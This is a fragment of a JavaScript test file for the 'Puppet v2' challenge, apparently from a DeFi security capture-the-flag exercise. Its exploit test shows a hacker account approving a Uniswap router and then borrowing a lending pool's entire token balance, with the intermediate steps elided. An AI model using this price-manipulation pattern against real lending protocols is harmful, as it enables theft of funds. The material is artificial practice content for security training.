...
describe("[Challenge] Puppet v2", function () {
  ...
  const HACKER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
  const HACKER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;
  ...
  it("Exploit", async function () {
    ...
    await token
      .connect(hacker)
      .approve(uniswapRouter.address, HACKER_INITIAL_TOKEN_BALANCE);
    ...
    await lendingPool.connect(hacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
  });
